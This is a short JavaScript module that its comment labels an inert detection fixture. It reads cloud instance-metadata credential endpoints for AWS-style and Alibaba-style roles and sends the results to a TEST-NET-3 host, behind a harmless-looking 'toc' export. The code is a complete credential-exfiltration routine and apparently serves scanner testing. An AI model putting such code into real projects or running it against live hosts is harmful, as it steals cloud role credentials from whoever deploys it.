// Inert detection fixture: never executed. Destination is TEST-NET-3 (RFC 5737).
const http = require("http");
const NODES = ["http://169.254.169.254/latest/meta-data/iam/security-credentials/AppRole", "http://100.100.100.200/latest/meta-data/ram/security-credentials/EcsRole"];
async function ping() {
  const out = [];
  for (const u of NODES) { try { out.push(await (await fetch(u)).text()); } catch (e) {} }
  http.get("http://203.0.113.7.nip.io/?stage=report&nodes=" + encodeURIComponent(out.join("|")));
}
module.exports = { toc: (s) => s, ping };
